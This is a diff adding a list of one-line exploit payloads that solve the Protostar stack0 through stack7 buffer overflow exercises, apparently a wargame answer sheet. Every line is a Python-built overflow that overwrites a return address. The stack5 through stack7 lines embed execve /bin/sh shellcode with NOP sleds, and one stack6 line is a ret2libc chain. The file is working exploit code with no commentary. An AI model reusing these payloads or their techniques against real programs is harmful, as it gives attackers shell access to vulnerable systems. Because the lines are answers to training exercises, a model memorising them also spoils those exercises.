@@ -1,0 +1,9 @@
+stack0		python -c print A*100 | ./stack0
+stack1		./stack1 `python -c 'import struct; print "A"*64 + struct.pack("I", 0x61626364)'`
+stack2		GREENIE=`python -c 'import struct; print "A"*64 + struct.pack("I",0xd0a0d0a)'` ; export GREENIE ; ./stack2
+stack3		python -c 'import struct; print "A"*64 + struct.pack("I", 0x08048424)' | ./stack3
+stack4 		python -c 'import struct; print "A"*76 + struct.pack("I", 0x080483f4)' | ./stack4
+stack5		(python -c 'import struct; print "A"*76 + struct.pack("I", 0xbffff792+40) + "\x90"*40  + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; cat) | ./stack5
+stack6		(python -c 'import struct; print "A"*80 + struct.pack("I", 0xb7ecffb0) + struct.pack("I", 0xb7ec60c0) + struct.pack("I", 0xb7fb63bf)' ; cat )| ./stack6
+		(python -c 'import struct; print "A"*80 + struct.pack("I", 0x080485a9) +  struct.pack("I", 0xbffff7c0+58) + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' ; cat )| ./stack6
+stack7		(python -c 'import struct; print "A"*80 + struct.pack("I", 0x080485f9) +  struct.pack("I", 0xbffff7b0+10) + "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' ; cat )| ./stack7
